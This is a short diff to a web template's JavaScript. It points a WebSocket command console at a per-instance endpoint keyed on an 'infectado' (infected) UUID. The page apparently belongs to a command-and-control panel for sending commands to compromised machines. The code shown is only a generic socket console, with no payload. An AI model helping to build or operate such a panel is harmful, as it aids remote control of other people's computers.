@@ -23,7 +23,13 @@
     </div>
 </div>
 <script>
-    const socket = new WebSocket('ws://localhost:8000/ws/echo/');
+    const socket = new WebSocket(
+        'ws://'
+        + window.location.host
+        + '/ws/instance/'
+        + '{{ infectado.uuid }}'
+        + '/'
+    );
     socket.onmessage = (e) => {
         datos = JSON.parse(e.data);
         if ("command" in datos) {
@@ -38,7 +44,7 @@
     }
 
     document.getElementById('command').onkeyup = function (e) {
-        if (e.keyCode === 13) {  // enter, return
+        if (e.keyCode === 13) {
             document.getElementById('button-send').click();
         }
     };
@@ -47,7 +53,7 @@
         exp = inputfield.value;
         socket.send(JSON.stringify(
             {
-                command: exp
+                'command': exp
             }
         ))
         inputfield.value = "";
